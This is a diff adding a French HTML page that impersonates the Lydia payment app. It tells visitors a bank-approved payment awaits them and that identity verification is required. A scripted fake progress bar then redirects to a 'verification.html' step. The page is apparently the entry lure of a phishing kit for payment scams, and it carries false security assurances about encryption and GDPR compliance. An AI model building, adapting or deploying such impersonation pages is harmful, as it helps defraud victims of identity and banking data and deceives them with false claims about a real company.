@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lydia – Validation de compte</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --primary-blue: #0066FF;
+      --primary-light: #E3F2FD;
+      --white: #FFFFFF;
+      --black: #000;
+      --gray-light: #f8f9fa;
+      --gray-medium: #e9ecef;
+      --gray-dark: #6c757d;
+      --shadow: 0 10px 30px rgba(0,0,0,0.15);
+      --shadow-light: 0 5px 15px rgba(0,0,0,0.1);
+      --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+      --border-radius: 20px;
+      --green: #28a745;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--primary-light);
+      color: var(--black);
+      line-height: 1.5;
+      overflow-x: hidden;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .container { width: 100%; max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+    header { background: var(--primary-light); position: sticky; top: 0; z-index: 1000; box-shadow: var(--shadow-light); padding: 15px 0; }
+    .header-container { display: flex; justify-content: space-between; align-items: center; width: 100%; max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+    .logo { display: flex; align-items: center; gap: 12px; font-size: 32px; font-weight: 900; letter-spacing: -1px; color: var(--primary-blue); text-shadow: 1px 1px 2px rgba(0,0,0,0.1); }
+    .logo-icon { width: 40px; height: 40px; background: var(--primary-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 24px; }
+
+    .desktop-nav { display: flex; gap: 30px; }
+    .desktop-nav a { text-decoration: none; color: var(--black); font-weight: 600; font-size: 17px; display: flex; align-items: center; gap: 8px; padding: 8px 16px; border-radius: 50px; transition: var(--transition); }
+    .desktop-nav a:hover, .desktop-nav a.active { background: rgba(0, 102, 255, 0.1); color: var(--primary-blue); transform: translateY(-2px); }
+
+    .mobile-menu-btn { display: none; background: none; border: none; cursor: pointer; width: 30px; height: 25px; position: relative; z-index: 1001; }
+    .mobile-menu-btn span { display: block; width: 100%; height: 3px; background: var(--primary-blue); border-radius: 3px; transition: var(--transition); position: absolute; }
+    .mobile-menu-btn span:nth-child(1) { top: 0; }
+    .mobile-menu-btn span:nth-child(2) { top: 11px; }
+    .mobile-menu-btn span:nth-child(3) { top: 22px; }
+
+    .mobile-menu-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 999; opacity: 0; transition: opacity 0.3s ease; }
+    .mobile-nav { display: none; position: fixed; top: 0; right: -100%; width: 85%; max-width: 400px; height: 100%; background: var(--white); z-index: 1000; box-shadow: -5px 0 15px rgba(0,0,0,0.1); transition: right 0.4s cubic-bezier(0.77, 0.2, 0.05, 1); display: flex; flex-direction: column; }
+    .mobile-nav.active { right: 0; }
+    .mobile-nav-header { display: flex; justify-content: space-between; align-items: center; padding: 20px; border-bottom: 1px solid rgba(0,0,0,0.1); }
+    .mobile-menu-close { background: none; border: none; font-size: 24px; color: var(--primary-blue); cursor: pointer; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: var(--transition); }
+    .mobile-menu-close:hover { background: rgba(0, 102, 255, 0.1); }
+    .mobile-nav-links { flex: 1; padding: 20px 0; }
+    .mobile-nav-links a { display: flex; align-items: center; gap: 15px; padding: 18px 30px; text-decoration: none; color: var(--black); font-weight: 600; font-size: 18px; transition: var(--transition); border-left: 4px solid transparent; }
+    .mobile-nav-links a:hover, .mobile-nav-links a.active { background: rgba(0, 102, 255, 0.1); border-left-color: var(--primary-blue); color: var(--primary-blue); }
+    .mobile-nav-footer { padding: 20px; text-align: center; border-top: 1px solid rgba(0,0,0,0.1); color: var(--gray-dark); font-weight: 600; }
+
+    .validation-hero { padding: 60px 0 40px; text-align: center; }
+    .validation-hero h1 { font-size: 42px; font-weight: 900; margin-bottom: 20px; color: var(--primary-blue); }
+    .validation-hero p { font-size: 18px; color: var(--gray-dark); max-width: 700px; margin: 0 auto 40px; }
+
+    .progress-section { background: var(--white); border-radius: var(--border-radius); padding: 40px; margin: 30px auto; max-width: 800px; box-shadow: var(--shadow); text-align: center; }
+    .progress-header { margin-bottom: 40px; }
+    .progress-header h2 { font-size: 28px; font-weight: 700; color: var(--black); margin-bottom: 15px; }
+    .progress-header .subtitle { font-size: 18px; color: var(--primary-blue); font-weight: 600; background: rgba(0, 102, 255, 0.1); padding: 10px 20px; border-radius: 50px; display: inline-block; border: 2px solid rgba(0, 102, 255, 0.3); }
+
+    .progress-container { width: 100%; margin: 40px 0; }
+    .progress-label { display: flex; justify-content: space-between; margin-bottom: 10px; font-weight: 600; }
+    .progress-label span:first-child { color: var(--black); }
+    .progress-label span:last-child { color: var(--primary-blue); font-size: 24px; font-weight: 900; }
+
+    .progress-bar { width: 100%; height: 30px; background: var(--gray-medium); border-radius: 15px; overflow: hidden; position: relative; box-shadow: inset 0 2px 5px rgba(0,0,0,0.1); }
+    .progress-fill { height: 100%; background: linear-gradient(90deg, var(--primary-blue), #0052CC); border-radius: 15px; width: 50%; position: relative; transition: width 1.5s ease-in-out; box-shadow: 0 2px 10px rgba(0, 102, 255, 0.3); }
+    .progress-fill::after { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(90deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0.3) 50%, rgba(255,255,255,0.1) 100%); animation: shimmer 2s infinite; }
+
+    @keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+
+    .status-indicators { display: flex; justify-content: space-between; margin-top: 30px; position: relative; }
+    .status-indicators::before { content: ''; position: absolute; top: 15px; left: 0; right: 0; height: 3px; background: var(--gray-medium); z-index: 1; }
+    .status-step { display: flex; flex-direction: column; align-items: center; z-index: 2; position: relative; }
+    .status-step .step-icon { width: 35px; height: 35px; border-radius: 50%; background: var(--gray-medium); display: flex; align-items: center; justify-content: center; margin-bottom: 10px; font-weight: bold; color: var(--white); }
+    .status-step.active .step-icon { background: var(--primary-blue); box-shadow: 0 0 0 5px rgba(0, 102, 255, 0.2); }
+    .status-step.completed .step-icon { background: var(--primary-blue); }
+    .status-step .step-label { font-size: 14px; font-weight: 600; text-align: center; max-width: 100px; }
+
+    .warning-section { background: rgba(0, 102, 255, 0.05); border-left: 5px solid var(--primary-blue); border-radius: 10px; padding: 25px; margin: 40px auto; max-width: 800px; text-align: left; box-shadow: var(--shadow-light); }
+    .warning-header { display: flex; align-items: center; gap: 15px; margin-bottom: 15px; }
+    .warning-header i { color: var(--primary-blue); font-size: 28px; }
+    .warning-header h3 { font-size: 22px; font-weight: 700; color: var(--black); margin: 0; }
+    .warning-section p { font-size: 16px; line-height: 1.6; color: var(--black); margin-bottom: 10px; }
+
+    .button-section { text-align: center; padding: 40px 0; margin: 40px auto; max-width: 800px; }
+    .activation-button { position: relative; overflow: hidden; padding: 22px 50px; border: none; border-radius: 50px; font-weight: 900; font-size: 20px; cursor: pointer; transition: var(--transition); display: inline-flex; align-items: center; justify-content: center; gap: 15px; background: linear-gradient(135deg, var(--primary-blue), #0052CC); color: var(--white); box-shadow: 0 10px 25px rgba(0, 102, 255, 0.3); text-transform: uppercase; letter-spacing: 1px; min-width: 350px; }
+    .activation-button:hover { transform: translateY(-8px); box-shadow: 0 15px 35px rgba(0, 102, 255, 0.4); background: linear-gradient(135deg, #0052CC, var(--primary-blue)); }
+    .activation-button:active { transform: translateY(-4px); }
+    .activation-button i { font-size: 24px; animation: bounce 2s infinite; }
+    @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+
+    .btn-click-effect { position: absolute; background: rgba(255,255,255,0.3); border-radius: 50%; transform: scale(0); animation: clickEffect 0.5s ease-out; pointer-events: none; }
+    @keyframes clickEffect { to { transform: scale(4); opacity: 0; } }
+
+    .security-section { background: #e8f4ff; border-radius: var(--border-radius); padding: 30px; margin: 40px auto; max-width: 800px; box-shadow: var(--shadow-light); text-align: center; }
+    .security-section h4 { font-size: 18px; font-weight: 700; color: var(--black); margin-bottom: 15px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+    .security-section p { font-size: 14px; color: var(--gray-dark); line-height: 1.5; }
+
+    .slide-in { opacity: 0; transform: translateY(30px); transition: all 0.8s cubic-bezier(0.22, 1, 0.36, 1); }
+    .slide-in.visible { opacity: 1; transform: translateY(0); }
+
+    footer { background: var(--black); color: var(--white); padding: 60px 0 30px; margin-top: auto; width: 100%; }
+    .footer-content { display: flex; flex-wrap: wrap; justify-content: center; gap: 40px; margin-bottom: 40px; width: 100%; max-width: 1200px; margin: 0 auto 40px; }
+    .footer-section { flex: 1; min-width: 250px; display: flex; flex-direction: column; align-items: center; text-align: center; }
+    .footer-section h3 { font-size: 24px; margin-bottom: 20px; color: var(--primary-blue); text-align: center; }
+    .footer-section p { margin-bottom: 15px; opacity: 0.9; text-align: center; }
+    .footer-section a { display: block; color: var(--white); text-decoration: none; margin-bottom: 10px; opacity: 0.8; transition: var(--transition); text-align: center; }
+    .footer-section a:hover { opacity: 1; color: var(--primary-blue); transform: translateX(5px); }
+    .social-icons { display: flex; gap: 15px; margin-top: 20px; justify-content: center; }
+    .social-icons a { width: 40px; height: 40px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: var(--transition); }
+    .social-icons a:hover { background: var(--primary-blue); color: var(--white); transform: translateY(-3px); }
+    .footer-bottom { text-align: center; padding-top: 30px; border-top: 1px solid rgba(255,255,255,0.1); opacity: 0.7; width: 100%; max-width: 1200px; margin: 0 auto; }
+
+    @media (max-width: 768px) {
+      .desktop-nav { display: none; }
+      .mobile-menu-btn { display: block; }
+      .mobile-nav { display: flex; }
+      .mobile-menu-overlay.active { display: block; opacity: 1; }
+      .mobile-nav.active { right: 0; }
+      .mobile-menu-btn.active span:nth-child(1) { transform: rotate(45deg); top: 11px; }
+      .mobile-menu-btn.active span:nth-child(2) { opacity: 0; }
+      .mobile-menu-btn.active span:nth-child(3) { transform: rotate(-45deg); top: 11px; }
+      .logo { font-size: 24px; }
+      .validation-hero h1 { font-size: 32px; }
+      .progress-section, .warning-section, .security-section { padding: 30px 20px; margin: 20px; }
+      .activation-button { min-width: 280px; padding: 18px 30px; font-size: 18px; }
+      .footer-content { flex-direction: column; gap: 30px; align-items: center; }
+    }
+
+    @media (max-width: 480px) {
+      .container { padding: 0 15px; }
+      .logo { font-size: 24px; }
+      .validation-hero h1 { font-size: 28px; }
+      .validation-hero p { font-size: 16px; }
+      .progress-label span:last-child { font-size: 20px; }
+      .activation-button { min-width: 250px; padding: 16px 25px; font-size: 16px; }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="container header-container">
+      <div class="logo">
+        <div class="logo-icon">Λ</div>
+        Lydia
+      </div>
+      <nav class="desktop-nav">
+        <a href="index.html"><i class="fas fa-home"></i> Accueil</a>
+      </nav>
+      <button class="mobile-menu-btn" aria-label="Menu">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+      <div class="mobile-menu-overlay"></div>
+      <nav class="mobile-nav">
+        <div class="mobile-nav-header">
+          <div class="logo">
+            <div class="logo-icon">Λ</div>
+            Lydia
+          </div>
+          <button class="mobile-menu-close" aria-label="Fermer">
+            <i class="fas fa-times"></i>
+          </button>
+        </div>
+        <div class="mobile-nav-links">
+          <a href="index.html">
+            <i class="fas fa-home"></i>
+            <span>Accueil</span>
+          </a>
+        </div>
+        <div class="mobile-nav-footer">
+          <p>Paiement instantané sécurisé</p>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <main>
+    <section class="validation-hero">
+      <div class="container">
+        <h1 class="slide-in">Validation de votre compte Lydia</h1>
+        <p class="slide-in">Suivez le processus de vérification pour activer votre compte et sécuriser vos transactions</p>
+      </div>
+    </section>
+
+    <section class="progress-section slide-in">
+      <div class="container">
+        <div class="progress-header">
+          <div class="subtitle">Paiement en attente de validation – Action requise</div>
+        </div>
+        
+        <div class="progress-container">
+          <div class="progress-label">
+            <span>Progression de la validation</span>
+            <span>50%</span>
+          </div>
+          <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+          </div>
+        </div>
+        
+        <div class="status-indicators">
+          <div class="status-step completed">
+            <div class="step-icon">
+              <i class="fas fa-check"></i>
+            </div>
+            <div class="step-label">Inscription</div>
+          </div>
+          
+          <div class="status-step active">
+            <div class="step-icon">2</div>
+            <div class="step-label">Vérification Identité</div>
+          </div>
+          
+          <div class="status-step">
+            <div class="step-icon">3</div>
+            <div class="step-label">Validation Bancaire</div>
+          </div>
+          
+          <div class="status-step">
+            <div class="step-icon">4</div>
+            <div class="step-label">Compte Actif</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="button-section slide-in">
+      <div class="container">
+        <button class="activation-button" id="activateButton">
+          <i class="fas fa-play-circle"></i>
+          ACCEPTER ET CONTINUER ✅
+          <span class="btn-click-effect"></span>
+        </button>
+      </div>
+    </section>
+
+    <section class="warning-section slide-in">
+      <div class="container">
+        <div class="warning-header">
+          <i class="fas fa-shield-alt"></i>
+          <h3>Message important de sécurité</h3>
+        </div>
+        <p>
+          Vous avez reçu un paiement approuvé par la banque de l'émetteur. Pour des raisons de sécurité, et afin de lutter contre la fraude et l'usurpation d'identité, la confirmation de votre identité est obligatoire pour valider votre compte Lydia. Cette vérification protège votre compte contre les fraudes liées à la carte bancaire.
+        </p>
+        <p>
+          Veuillez suivre les instructions pour confirmer votre identité et finaliser la validation de votre compte. Nous vous remercions de votre coopération.
+        </p>
+        <p>
+          <strong>Cordialement, l'équipe Lydia.</strong>
+        </p>
+      </div>
+    </section>
+
+    <section class="security-section slide-in">
+      <div class="container">
+        <h4><i class="fas fa-shield-alt"></i> Sécurité garantie</h4>
+        <p>
+          Vos données sont protégées par un chiffrement de niveau bancaire. Lydia est conforme aux réglementations RGPD et aux normes de sécurité les plus strictes du secteur financier.
+        </p>
+      </div>
+    </section>
+
+  </main>
+
+  <footer>
+    <div class="container">
+      <div class="footer-content">
+        <div class="footer-section">
+          <h3>Lydia</h3>
+          <p>Le futur du paiement instantané</p>
+          <div class="social-icons">
+            <a href="#" title="Facebook"><i class="fab fa-facebook-f"></i></a>
+            <a href="#" title="Twitter"><i class="fab fa-twitter"></i></a>
+            <a href="#" title="Instagram"><i class="fab fa-instagram"></i></a>
+            <a href="#" title="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
+          </div>
+        </div>
+        
+        <div class="footer-section">
+          <h3>Navigation</h3>
+          <a href="index.html">Accueil</a>
+          <a href="#">À propos</a>
+          <a href="#">Services</a>
+          <a href="#">Contact</a>
+        </div>
+        
+        <div class="footer-section">
+          <h3>Sécurité</h3>
+          <p><i class="fas fa-shield-alt"></i> Cryptage SSL 256 bits</p>
+          <p><i class="fas fa-lock"></i> Données sécurisées</p>
+        </div>
+      </div>
+      
+      <div class="footer-bottom">
+        <p>&copy; 2026 Lydia. Tous droits réservés.</p>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
+      const mobileMenuClose = document.querySelector('.mobile-menu-close');
+      const mobileMenuOverlay = document.querySelector('.mobile-menu-overlay');
+      const mobileNav = document.querySelector('.mobile-nav');
+      const mobileLinks = document.querySelectorAll('.mobile-nav-links a');
+      
+      mobileMenuBtn.addEventListener('click', () => {
+        mobileNav.classList.add('active');
+        mobileMenuOverlay.classList.add('active');
+        mobileMenuBtn.classList.add('active');
+        document.body.style.overflow = 'hidden';
+      });
+      
+      function closeMobileMenu() {
+        mobileNav.classList.remove('active');
+        mobileMenuOverlay.classList.remove('active');
+        mobileMenuBtn.classList.remove('active');
+        document.body.style.overflow = '';
+      }
+      
+      mobileMenuClose.addEventListener('click', closeMobileMenu);
+      mobileMenuOverlay.addEventListener('click', closeMobileMenu);
+      mobileLinks.forEach(link => link.addEventListener('click', closeMobileMenu));
+      
+      const progressFill = document.getElementById('progressFill');
+      setTimeout(() => {
+        progressFill.style.width = '50%';
+      }, 500);
+      
+      const elements = document.querySelectorAll('.slide-in');
+      const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+          if (entry.isIntersecting) {
+            entry.target.classList.add('visible');
+            observer.unobserve(entry.target);
+          }
+        });
+      }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });
+      elements.forEach(el => observer.observe(el));
+      
+      const activateButton = document.getElementById('activateButton');
+      
+      activateButton.addEventListener('click', function(e) {
+        const effect = this.querySelector('.btn-click-effect');
+        if (effect) {
+          effect.style.left = (e.offsetX - 50) + 'px';
+          effect.style.top = (e.offsetY - 50) + 'px';
+          effect.style.width = '100px';
+          effect.style.height = '100px';
+          effect.style.animation = 'none';
+          void effect.offsetWidth;
+          effect.style.animation = 'clickEffect 0.5s ease-out';
+        }
+        
+        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> APPROBATION EN COURS...';
+        this.disabled = true;
+        this.style.background = 'linear-gradient(135deg, var(--primary-blue), #0052CC)';
+        
+        let progress = 25;
+        const progressInterval = setInterval(() => {
+          progress += 5.4;
+          if (progress > 75) progress = 75;
+          progressFill.style.width = progress + '%';
+          
+          if (progress >= 75) {
+            clearInterval(progressInterval);
+            progressFill.style.width = '75%';
+            document.querySelector('.progress-label span:last-child').textContent = '75%';
+            
+            document.querySelectorAll('.status-step').forEach((step, index) => {
+              if (index < 2) {
+                step.classList.add('completed');
+                step.classList.remove('active');
+                const icon = step.querySelector('.step-icon');
+                icon.innerHTML = '<i class="fas fa-check"></i>';
+              }
+              if (index === 2) {
+                step.classList.add('active');
+              }
+            });
+            
+            document.querySelector('.progress-section .subtitle').textContent = 'Vérification bancaire en cours...';
+            
+            if (navigator.vibrate) {
+              navigator.vibrate([100, 50, 100]);
+            }
+            
+            setTimeout(() => {
+              window.location.href = "verification.html";
+            }, 2000);
+          }
+        }, 300);
+      });
+      
+      window.addEventListener('resize', () => {
+        if (window.innerWidth > 768 && mobileNav.classList.contains('active')) {
+          closeMobileMenu();
+        }
+      });
+    });
+  </script>
+</body>
+</html>
